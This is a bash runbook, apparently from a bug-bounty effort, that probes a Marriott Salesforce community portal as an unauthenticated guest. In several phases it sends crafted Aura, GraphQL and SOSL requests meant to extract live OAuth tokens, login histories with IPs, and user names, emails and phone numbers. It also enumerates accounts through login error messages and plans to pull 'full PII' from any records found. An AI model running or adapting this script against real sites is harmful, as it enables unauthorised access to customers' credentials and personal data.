# Session 10 Runbook — M002 Chain Elevation (getItems + executeGraphQL fixes)
# Goal: Run getItems on all 187 getConfigData objects + fixed executeGraphQL queries
# Date: 2026-06-22
# Context: Session 9 discovered 187 guest-accessible objects via getConfigData.
#          ALL getItems tests failed with Python SyntaxError: 'return' outside function
#          in the ad-hoc parse_items helper. executeGraphQL failed with ValidationError
#          because Id {value} is invalid for scalar type ID!.
#          This session fixes both bugs and exhausts all record-access chain paths.
# Critical objects from getConfigData (Tier 1 — high PII/token risk):
#   NetworkMember (0DO), OauthToken (0CQ), UserLogin (0Yw)
# Critical objects from getConfigData (Tier 2 — community data):
#   ContentDocument (069), CollaborationGroup (0F9), FeedItem (0D5), Network (0DB)
#   CollaborationGroupMember (0FK), ContentVersion (068), Profile (00e)
# executeGraphQL fix: Id is a scalar leaf — use `Id` directly, NOT `Id {value}`

export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/home/gorib/go/bin:/home/gorib/.pdtm/go/bin:/home/gorib/.local/bin

BB="${BB:-$HOME/bug-bounty-hunting-}"
OUTDIR="$BB/results/marriott/session10"
mkdir -p "$OUTDIR"
exec > >(tee "$OUTDIR/session10-output.txt") 2>&1

echo "=== SESSION 10 START: $(date) ==="

# ============================================================
# PHASE A — BOOTSTRAP (fresh fwuid + session cookies)
# ============================================================
echo ""
echo "===== PHASE A: BOOTSTRAP ====="

echo "--- A1: Fresh guest session cookie ---"
curl -skL -c /tmp/cpp-s10-cookies.txt "https://cpp.marriott.com/s/" -o /tmp/cpp-s10-home.html
echo "Cookie file:"
cat /tmp/cpp-s10-cookies.txt | grep -v '^#' | grep -v '^$'

echo "--- A2: Extract fresh fwuid ---"
FRESH_FWUID=$(cat /tmp/cpp-s10-home.html | python3 -c "
import sys, re
html = sys.stdin.read()
m = re.search(r'\"fwuid\"\s*:\s*\"([^\"]+)\"', html)
if m:
    print(m.group(1))
    import sys; sys.exit(0)
m = re.search(r'fwuid=([A-Za-z0-9_\-]+)', html)
if m:
    print(m.group(1))
" 2>/dev/null)

echo "Fresh fwuid from page: ${FRESH_FWUID:-NOT FOUND}"

if [ -z "$FRESH_FWUID" ]; then
  FRESH_FWUID="cmpKNldRZXRSMkdjemxQdjBkbl9uQWtVMjdnTGFERUU2S3FfSVdrcU92bkExNC4xOTIuODM4ODYwOA"
  echo "Using Session 7 fwuid (fallback): ${FRESH_FWUID}"
fi

echo "--- A3: Validate fwuid with getObjectInfo(User) ---"
curl -sk -X POST "https://cpp.marriott.com/s/sfsites/aura" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -b /tmp/cpp-s10-cookies.txt \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"aura://RecordUiController/ACTION$getObjectInfo","callingDescriptor":"UNKNOWN","params":{"objectApiName":"User"}}]}' \
  --data-urlencode "aura.context={\"mode\":\"PROD\",\"fwuid\":\"${FRESH_FWUID}\",\"app\":\"siteforce:communityApp\",\"loaded\":{},\"dn\":[],\"globals\":{},\"uad\":true}" \
  --data-urlencode 'aura.pageURI=/s/' \
  --data-urlencode 'aura.token=undefined' \
  | python3 -c "
import sys, json
d = sys.stdin.read()
print(f'size={len(d)}B')
try:
    obj = json.loads(d[d.index('{'):])
    for a in obj.get('actions', []):
        rv = a.get('returnValue') or {}
        print(f'state={a.get(\"state\",\"?\")} | fields={len(rv.get(\"fields\",{}))}')
except Exception as e:
    # If warning, extract new fwuid from response
    import re
    fw = re.findall(r'\"fwuid\"\s*:\s*\"([A-Za-z0-9_\-]{20,})\"', d)
    if fw:
        print(f'NEW fwuid in response: {fw[0]}')
    print(f'parse_err={e}')
    print(d[:300])
"

# A4: If A3 returned warning, force-extract new fwuid
echo "--- A4: Force-extract fwuid from bootstrap error ---"
BOOTSTRAP_FWUID=$(curl -sk -X POST "https://cpp.marriott.com/s/sfsites/aura" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -b /tmp/cpp-s10-cookies.txt \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"aura://RecordUiController/ACTION$getObjectInfo","callingDescriptor":"UNKNOWN","params":{"objectApiName":"User"}}]}' \
  --data-urlencode 'aura.context={"mode":"PROD","fwuid":"FORCE_REFRESH","app":"siteforce:communityApp","loaded":{},"dn":[],"globals":{},"uad":true}' \
  --data-urlencode 'aura.pageURI=/s/' \
  --data-urlencode 'aura.token=undefined' \
  | python3 -c "
import sys, re
d = sys.stdin.read()
hits = re.findall(r'\"fwuid\"\s*:\s*\"([A-Za-z0-9_\-]{20,})\"', d)
if hits:
    print(hits[0])
" 2>/dev/null)

if [ -n "$BOOTSTRAP_FWUID" ]; then
  echo "Bootstrap extracted new fwuid: $BOOTSTRAP_FWUID"
  FRESH_FWUID="$BOOTSTRAP_FWUID"
  echo "Revalidating with new fwuid..."
  curl -sk -X POST "https://cpp.marriott.com/s/sfsites/aura" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -b /tmp/cpp-s10-cookies.txt \
    --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"aura://RecordUiController/ACTION$getObjectInfo","callingDescriptor":"UNKNOWN","params":{"objectApiName":"User"}}]}' \
    --data-urlencode "aura.context={\"mode\":\"PROD\",\"fwuid\":\"${FRESH_FWUID}\",\"app\":\"siteforce:communityApp\",\"loaded\":{},\"dn\":[],\"globals\":{},\"uad\":true}" \
    --data-urlencode 'aura.pageURI=/s/' \
    --data-urlencode 'aura.token=undefined' \
    | python3 -c "
import sys,json
d=sys.stdin.read()
try:
    obj=json.loads(d[d.index('{'):])
    for a in obj.get('actions',[]):
        rv=a.get('returnValue') or {}
        print(f'REVALIDATION: state={a.get(\"state\",\"?\")} | fields={len(rv.get(\"fields\",{}))}')
except: print(d[:200])
"
fi

echo "=== USING FWUID: $FRESH_FWUID ==="

# ============================================================
# Helper functions — CORRECT (no return-outside-function bug)
# ============================================================

# Standard Aura caller
aura() {
  local descriptor="$1"
  local params="$2"
  curl -sk -X POST "https://cpp.marriott.com/s/sfsites/aura" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -b /tmp/cpp-s10-cookies.txt \
    --data-urlencode "message={\"actions\":[{\"id\":\"1;a\",\"descriptor\":\"${descriptor}\",\"callingDescriptor\":\"UNKNOWN\",\"params\":${params}}]}" \
    --data-urlencode "aura.context={\"mode\":\"PROD\",\"fwuid\":\"${FRESH_FWUID}\",\"app\":\"siteforce:communityApp\",\"loaded\":{},\"dn\":[],\"globals\":{},\"uad\":true}" \
    --data-urlencode 'aura.pageURI=/s/' \
    --data-urlencode 'aura.token=undefined'
}

# Full parser — NO return-outside-function bug
parse() {
  python3 -c "
import sys, json, re
raw = sys.stdin.read()
print(f'size={len(raw)}B')
try:
    obj = json.loads(raw[raw.index('{'):])
    fw = re.findall(r'\"fwuid\"\s*:\s*\"([A-Za-z0-9_\-]{20,})\"', raw)
    if fw:
        print(f'  [fwuid in response: {fw[0][:50]}...]')
    for a in obj.get('actions', []):
        state = a.get('state', '?')
        rv = a.get('returnValue') or {}
        err = a.get('error') or []
        print(f'  state={state}')
        if isinstance(rv, dict):
            keys = list(rv.keys())[:8]
            print(f'  returnValue keys: {keys}')
            flds = rv.get('fields', {})
            if flds:
                print(f'  field_count={len(flds)}')
            for rkey in ['records','items','data','result','users','contacts','members']:
                recs = rv.get(rkey)
                if isinstance(recs, list) and recs:
                    print(f'  *** RECORDS ({rkey}): {len(recs)} items ***')
                    for r in recs[:3]:
                        print(f'    {json.dumps(r)[:400]}')
            if isinstance(rv.get('records'), dict):
                inner = rv['records'].get('records', [])
                if inner:
                    print(f'  *** NESTED RECORDS: {len(inner)} ***')
                    for r in inner[:3]:
                        print(f'    {json.dumps(r)[:400]}')
        elif isinstance(rv, list) and rv:
            print(f'  returnValue list: {len(rv)} items')
            for r in rv[:3]:
                print(f'    {json.dumps(r)[:300]}')
        elif rv:
            print(f'  returnValue: {str(rv)[:200]}')
        if err:
            msg = err[0].get('message','') if isinstance(err, list) and err else str(err)
            print(f'  error: {msg[:300]}')
except Exception as e:
    print(f'  parse_error: {e}')
    print(f'  raw: {raw[:300]}')
" 2>&1
}

# Compact getItems parser that avoids the SyntaxError — wrapper around parse
parse_items() {
  python3 -c "
import sys, json
raw = sys.stdin.read()
size = len(raw)
try:
    obj = json.loads(raw[raw.index('{'):])
    for a in obj.get('actions', []):
        state = a.get('state', '?')
        rv = a.get('returnValue') or {}
        err = a.get('error') or []
        err_msg = ''
        if isinstance(err, list) and err:
            err_msg = err[0].get('message', '') if isinstance(err[0], dict) else str(err[0])
        elif err:
            err_msg = str(err)
        # Extract records from various possible keys
        records = []
        if isinstance(rv, dict):
            for k in ['records','items','data','result','members','users']:
                v = rv.get(k)
                if isinstance(v, list) and v:
                    records = v
                    break
            if not records and isinstance(rv.get('records'), dict):
                records = rv['records'].get('records', [])
        # Print summary
        if state == 'SUCCESS' and records:
            print(f'RECORDS_FOUND size={size}B state={state} count={len(records)}')
            for r in records[:2]:
                print(f'  RECORD: {json.dumps(r)[:400]}')
        elif state == 'SUCCESS':
            print(f'SUCCESS_EMPTY size={size}B rv_keys={list(rv.keys())[:6] if isinstance(rv,dict) else type(rv).__name__}')
        else:
            print(f'state={state} size={size}B err={err_msg[:200]}')
except Exception as e:
    print(f'PARSE_ERR size={size}B err={e}')
    print(raw[:200])
" 2>&1
}

# ============================================================
# PHASE B — getItems on ALL Tier 1 objects from getConfigData
# These are the objects where getConfigData returned a key prefix
# for the Guest User profile — meaning the object is accessible
# in principle, but FLS/sharing may still block actual records.
# ============================================================
echo ""
echo "===== PHASE B: getItems TIER 1 (HIGH PII/TOKEN RISK) ====="

# B1: NetworkMember (0DO) — community membership records
# If SUCCESS+records: community user list (name, status, role) = HIGH
echo "--- B1: getItems(NetworkMember) ---"
aura "serviceComponent://ui.force.components.controllers.lists.SelectableListDataProvider/ACTION\$getItems" \
  '{"entityNameOrId":"NetworkMember","layoutType":"COMPACT","pageSize":10,"currentPage":0}' | parse_items

# B2: OauthToken (0CQ) — live OAuth access tokens
# If SUCCESS+records: live OAuth tokens for community users = CRITICAL
echo "--- B2: getItems(OauthToken) ---"
aura "serviceComponent://ui.force.components.controllers.lists.SelectableListDataProvider/ACTION\$getItems" \
  '{"entityNameOrId":"OauthToken","layoutType":"COMPACT","pageSize":10,"currentPage":0}' | parse_items

# B3: UserLogin (0Yw) — user login history
# If SUCCESS+records: login timestamps + IP addresses = HIGH  
echo "--- B3: getItems(UserLogin) ---"
aura "serviceComponent://ui.force.components.controllers.lists.SelectableListDataProvider/ACTION\$getItems" \
  '{"entityNameOrId":"UserLogin","layoutType":"COMPACT","pageSize":10,"currentPage":0}' | parse_items

# B4: User (00Q prefix) — direct user records
# Already tested in Phase B of session 9 → actions:[] but never with correct fwuid
echo "--- B4: getItems(User) ---"
aura "serviceComponent://ui.force.components.controllers.lists.SelectableListDataProvider/ACTION\$getItems" \
  '{"entityNameOrId":"User","layoutType":"COMPACT","pageSize":10,"currentPage":0}' | parse_items

echo ""
echo "===== PHASE C: getItems TIER 2 (COMMUNITY DATA) ====="

# C1: ContentDocument (069) — shared files/documents
# If SUCCESS+records: list of uploaded partner documents = MEDIUM/HIGH
echo "--- C1: getItems(ContentDocument) ---"
aura "serviceComponent://ui.force.components.controllers.lists.SelectableListDataProvider/ACTION\$getItems" \
  '{"entityNameOrId":"ContentDocument","layoutType":"COMPACT","pageSize":10,"currentPage":0}' | parse_items

# C2: ContentVersion (068) — file versions (often exposes download links)
echo "--- C2: getItems(ContentVersion) ---"
aura "serviceComponent://ui.force.components.controllers.lists.SelectableListDataProvider/ACTION\$getItems" \
  '{"entityNameOrId":"ContentVersion","layoutType":"COMPACT","pageSize":10,"currentPage":0}' | parse_items

# C3: CollaborationGroup (0F9) — Chatter groups (reveals org structure)
echo "--- C3: getItems(CollaborationGroup) ---"
aura "serviceComponent://ui.force.components.controllers.lists.SelectableListDataProvider/ACTION\$getItems" \
  '{"entityNameOrId":"CollaborationGroup","layoutType":"COMPACT","pageSize":10,"currentPage":0}' | parse_items

# C4: CollaborationGroupMember (0FK) — group members (user IDs + group membership)
echo "--- C4: getItems(CollaborationGroupMember) ---"
aura "serviceComponent://ui.force.components.controllers.lists.SelectableListDataProvider/ACTION\$getItems" \
  '{"entityNameOrId":"CollaborationGroupMember","layoutType":"COMPACT","pageSize":10,"currentPage":0}' | parse_items

# C5: FeedItem (0D5) — community posts/activity feed
echo "--- C5: getItems(FeedItem) ---"
aura "serviceComponent://ui.force.components.controllers.lists.SelectableListDataProvider/ACTION\$getItems" \
  '{"entityNameOrId":"FeedItem","layoutType":"COMPACT","pageSize":10,"currentPage":0}' | parse_items

# C6: Network (0DB) — community network config
echo "--- C6: getItems(Network) ---"
aura "serviceComponent://ui.force.components.controllers.lists.SelectableListDataProvider/ACTION\$getItems" \
  '{"entityNameOrId":"Network","layoutType":"COMPACT","pageSize":10,"currentPage":0}' | parse_items

# C7: Profile (00e) — Salesforce profiles (user role/permission info)
echo "--- C7: getItems(Profile) ---"
aura "serviceComponent://ui.force.components.controllers.lists.SelectableListDataProvider/ACTION\$getItems" \
  '{"entityNameOrId":"Profile","layoutType":"COMPACT","pageSize":10,"currentPage":0}' | parse_items

# C8: Organization (00D) — org-level metadata
echo "--- C8: getItems(Organization) ---"
aura "serviceComponent://ui.force.components.controllers.lists.SelectableListDataProvider/ACTION\$getItems" \
  '{"entityNameOrId":"Organization","layoutType":"COMPACT","pageSize":10,"currentPage":0}' | parse_items

# ============================================================
# PHASE D — ALTERNATIVE: getListUi (list view API)
# Different code path from getItems — may have different FLS enforcement
# ============================================================
echo ""
echo "===== PHASE D: getListUi ALTERNATIVE RECORD ACCESS ====="

# D1: getListUi(User) — list views sometimes allow guest read if sharing rule set
echo "--- D1: getListUi(User, AllUsers) ---"
aura "aura://RecordUiController/ACTION\$getListUi" \
  '{"objectApiName":"User","listViewApiName":"AllUsers","pageSize":5,"pageToken":null,"fields":["User.Id","User.Name","User.Email"],"optionalFields":[],"sortBy":null,"updateMru":false}' | parse

echo "--- D2: getListUi(NetworkMember) ---"
aura "aura://RecordUiController/ACTION\$getListUi" \
  '{"objectApiName":"NetworkMember","listViewApiName":"AllNetworkMembers","pageSize":5,"pageToken":null,"fields":["NetworkMember.MemberId","NetworkMember.NetworkId","NetworkMember.Status"],"optionalFields":[],"sortBy":null,"updateMru":false}' | parse

echo "--- D3: getListUi(CollaborationGroup) ---"
aura "aura://RecordUiController/ACTION\$getListUi" \
  '{"objectApiName":"CollaborationGroup","listViewApiName":"AllCollaborationGroups","pageSize":5,"pageToken":null,"fields":["CollaborationGroup.Id","CollaborationGroup.Name","CollaborationGroup.MemberCount"],"optionalFields":[],"sortBy":null,"updateMru":false}' | parse

# ============================================================
# PHASE E — FIXED executeGraphQL queries
# FIX: Id is a scalar field (type ID!) — use `Id` directly, NOT `Id {value}`
# Salesforce uiapi GraphQL: scalar fields return directly; object/record fields use {value}
# ============================================================
echo ""
echo "===== PHASE E: FIXED executeGraphQL ====="

# E1: executeGraphQL(User) — FIXED: Id without {value}, Name/Email with {value}
echo "--- E1: executeGraphQL(User) - FIXED scalar Id ---"
aura "aura://RecordUiController/ACTION\$executeGraphQL" \
  '{"query":"query users {uiapi {query {User {edges {node {Id Name {value} Email {value} Phone {value} MobilePhone {value} FirstName {value} LastName {value} CompanyName {value}}} totalCount pageInfo {endCursor hasNextPage}}}}}","variables":{}}' | parse

# E2: executeGraphQL(NetworkMember) — community member records
echo "--- E2: executeGraphQL(NetworkMember) ---"
aura "aura://RecordUiController/ACTION\$executeGraphQL" \
  '{"query":"query members {uiapi {query {NetworkMember {edges {node {Id MemberId {value} NetworkId {value} Status {value}}} totalCount pageInfo {endCursor hasNextPage}}}}}","variables":{}}' | parse

# E3: executeGraphQL(CollaborationGroup) — Chatter groups with member counts
echo "--- E3: executeGraphQL(CollaborationGroup) ---"
aura "aura://RecordUiController/ACTION\$executeGraphQL" \
  '{"query":"query groups {uiapi {query {CollaborationGroup {edges {node {Id Name {value} MemberCount {value} CollaborationType {value}}} totalCount pageInfo {endCursor hasNextPage}}}}}","variables":{}}' | parse

# E4: executeGraphQL(FeedItem) — community posts
echo "--- E4: executeGraphQL(FeedItem) ---"
aura "aura://RecordUiController/ACTION\$executeGraphQL" \
  '{"query":"query feeds {uiapi {query {FeedItem {edges {node {Id Body {value} ParentId {value} CreatedDate {value}}} totalCount pageInfo {endCursor hasNextPage}}}}}","variables":{}}' | parse

# ============================================================
# PHASE F — searchRecords (SOSL-based — different access path)
# SOSL searches can bypass CRUD/FLS in some Salesforce versions
# ============================================================
echo ""
echo "===== PHASE F: searchRecords (SOSL path) ====="

echo "--- F1: searchRecords(User, q=a) ---"
aura "aura://RecordUiController/ACTION\$searchRecords" \
  '{"q":"a","objectApiName":"User","fields":["User.Id","User.Name","User.Email","User.FirstName","User.LastName","User.Phone","User.CompanyName"],"optionalFields":[],"pageSize":10}' | parse

echo "--- F2: searchRecords(NetworkMember, q=a) ---"
aura "aura://RecordUiController/ACTION\$searchRecords" \
  '{"q":"a","objectApiName":"NetworkMember","fields":["NetworkMember.MemberId","NetworkMember.NetworkId","NetworkMember.Status"],"optionalFields":[],"pageSize":10}' | parse

echo "--- F3: searchRecords(ContentDocument, q=a) ---"
aura "aura://RecordUiController/ACTION\$searchRecords" \
  '{"q":"a","objectApiName":"ContentDocument","fields":["ContentDocument.Id","ContentDocument.Title","ContentDocument.FileExtension","ContentDocument.FileSize"],"optionalFields":[],"pageSize":10}' | parse

# ============================================================
# PHASE G — getCurrentUserOrGuest + getRecord pivot
# getCurrentUserOrGuest reveals guest user Id.
# Then getRecord with guest's OWN id tests if self-read works.
# Real user Ids follow pattern 005XXXXXXXXXXXX (15/18 char).
# ============================================================
echo ""
echo "===== PHASE G: getCurrentUserOrGuest + getRecord pivot ====="

echo "--- G1: getCurrentUserOrGuest ---"
GUEST_ID=$(aura "aura://UserController/ACTION\$getCurrentUserOrGuest" '{}' | python3 -c "
import sys, json
raw = sys.stdin.read()
print(f'size={len(raw)}B')
try:
    obj = json.loads(raw[raw.index('{'):])
    for a in obj.get('actions', []):
        rv = a.get('returnValue') or {}
        print(f'state={a.get(\"state\",\"?\")}')
        if isinstance(rv, dict):
            uid = rv.get('id') or rv.get('Id') or rv.get('userId')
            print(f'userId={uid}')
            print(f'rv_keys={list(rv.keys())}')
            for k,v in list(rv.items())[:10]:
                print(f'  {k}={v}')
        elif rv:
            print(f'rv={str(rv)[:200]}')
        err = a.get('error') or []
        if err:
            msg = err[0].get('message','') if isinstance(err, list) and err else str(err)
            print(f'err={msg[:200]}')
except Exception as e:
    print(f'parse_err={e}')
    print(raw[:300])
" 2>&1)
echo "$GUEST_ID"

# Extract the guest user ID for pivot
GUEST_USER_ID=$(echo "$GUEST_ID" | grep -oP '(?<=userId=)0[0-9A-Za-z]{14,17}' | head -1)
echo "Extracted guest userId: ${GUEST_USER_ID:-NOT_FOUND}"

# G2: getRecord with guest's own ID
if [ -n "$GUEST_USER_ID" ]; then
  echo "--- G2: getRecord(guest user ID: $GUEST_USER_ID) ---"
  aura "aura://RecordUiController/ACTION\$getRecord" \
    "{\"recordId\":\"${GUEST_USER_ID}\",\"fields\":[\"User.Id\",\"User.Email\",\"User.Name\",\"User.FirstName\",\"User.LastName\",\"User.UserType\"],\"optionalFields\":[]}" | parse
fi

# ============================================================
# PHASE H — CommLoginController user enumeration
# Different error messages for valid vs invalid email = user enum
# ============================================================
echo ""
echo "===== PHASE H: CommLoginController email enumeration ====="

echo "--- H1: Invalid email (should say no account) ---"
aura "apex://CommLoginController/ACTION\$login" \
  '{"username":"zzz_definitely_invalid_99999@notreal-xyz-test.com","password":"INVALID_PW_TEST!","startUrl":""}' | parse

echo "--- H2: Marriott domain (corporate email format) ---"
aura "apex://CommLoginController/ACTION\$login" \
  '{"username":"test@marriott.com","password":"INVALID_PW_TEST!","startUrl":""}' | parse

echo "--- H3: Likely franchise partner domain format ---"
aura "apex://CommLoginController/ACTION\$login" \
  '{"username":"admin@marriottpartner.com","password":"INVALID_PW_TEST!","startUrl":""}' | parse

# ============================================================
# PHASE I — BATCH SCAN: getObjectInfos on accessible objects
# Test which objects return state=SUCCESS (FLS read permitted)
# Focus on objects with PII potential beyond User schema already confirmed
# ============================================================
echo ""
echo "===== PHASE I: BATCH OBJECT ACCESSIBILITY SCAN ====="

# I1: Objects from getConfigData Tier 1 — confirm FLS read access
echo "--- I1: getObjectInfos batch (Tier 1 objects) ---"
aura "aura://RecordUiController/ACTION\$getObjectInfos" \
  '{"objectApiNames":["NetworkMember","OauthToken","UserLogin","Network","NetworkSelfRegistration"]}' | python3 -c "
import sys, json
raw = sys.stdin.read()
print(f'size={len(raw)}B')
try:
    obj = json.loads(raw[raw.index('{'):])
    for a in obj.get('actions', []):
        rv = a.get('returnValue') or {}
        err = a.get('error') or []
        print(f'state={a.get(\"state\",\"?\")}')
        if isinstance(rv, dict):
            for name, info in rv.items():
                if isinstance(info, dict):
                    fcount = len(info.get('fields', {}))
                    print(f'  {name}: {fcount} fields - state=SUCCESS')
                elif info is None:
                    print(f'  {name}: null (403/blocked)')
                else:
                    print(f'  {name}: {str(info)[:100]}')
        if err:
            msg = err[0].get('message','') if isinstance(err,list) and err else str(err)
            print(f'error: {msg[:200]}')
except Exception as e:
    print(f'parse_err={e}')
    print(raw[:300])
" 2>&1

# I2: Tier 2 objects batch
echo "--- I2: getObjectInfos batch (Tier 2 objects) ---"
aura "aura://RecordUiController/ACTION\$getObjectInfos" \
  '{"objectApiNames":["ContentDocument","ContentVersion","CollaborationGroup","CollaborationGroupMember","FeedItem","FeedElement","FeedComment"]}' | python3 -c "
import sys, json
raw = sys.stdin.read()
print(f'size={len(raw)}B')
try:
    obj = json.loads(raw[raw.index('{'):])
    for a in obj.get('actions', []):
        rv = a.get('returnValue') or {}
        err = a.get('error') or []
        print(f'state={a.get(\"state\",\"?\")}')
        if isinstance(rv, dict):
            for name, info in rv.items():
                if isinstance(info, dict):
                    fcount = len(info.get('fields', {}))
                    print(f'  {name}: {fcount} fields - accessible')
                elif info is None:
                    print(f'  {name}: null (blocked)')
        if err:
            msg = err[0].get('message','') if isinstance(err,list) and err else str(err)
            print(f'error: {msg[:200]}')
except Exception as e:
    print(f'parse_err={e}')
    print(raw[:300])
" 2>&1

echo ""
echo "=== SESSION 10 COMPLETE: $(date) ==="
echo "=== OUTPUT: $OUTDIR/session10-output.txt ==="
echo ""
echo "=== DECISION MATRIX ==="
echo "B1 NetworkMember SUCCESS+records → HIGH: unauthenticated community user enumeration"
echo "B2 OauthToken SUCCESS+records → CRITICAL: live OAuth token exposure"
echo "B3 UserLogin SUCCESS+records → HIGH: login history + IPs accessible"
echo "E1 executeGraphQL(User) SUCCESS+data → HIGH: direct PII read via GraphQL"
echo "F1 searchRecords SUCCESS+records → HIGH: SOSL bypass of FLS"
echo "H1 vs H2 different errors → LOW-MEDIUM: user enumeration via login endpoint"
echo "ALL ERROR/empty → M002 remains Medium (schema-only). Report as standalone per CWE-284."
echo ""
echo "=== IF RECORDS FOUND: extract IDs and run getRecord on each for full PII ==="
